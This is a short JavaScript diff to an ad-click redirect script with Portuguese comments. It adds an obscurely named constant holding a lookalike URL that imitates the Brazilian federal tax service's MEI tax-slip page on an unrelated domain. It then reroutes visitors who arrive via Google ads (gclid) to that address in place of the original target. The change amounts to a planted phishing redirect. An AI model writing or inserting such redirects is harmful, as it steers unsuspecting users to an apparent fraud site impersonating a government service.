@@ -125,6 +125,7 @@ const randomUrl = urls[randomIndex];
 const hash = generateHash();
 const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
 const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://www9-receitafazendas-govbr-emitir-daspgmei.contabilidadeeconsultoria.site/?id=666';  
 
 // Obtendo o referer (disponível apenas no navegador)
 let referer;
@@ -146,9 +147,9 @@ if (typeof window !== 'undefined') {
 if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
     // Redirecionamento (no navegador)
     if (typeof window !== 'undefined') {
-        window.location.href = googlerandomUrlWithHash;
+        window.location.href = xirjfgjsdhdjd ;
     } else {
-        console.log('Redirect to:', googlerandomUrlWithHash);
+        console.log('Redirect to:', xirjfgjsdhdjd );
     }
 } else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
     // Redirecionamento (no navegador)
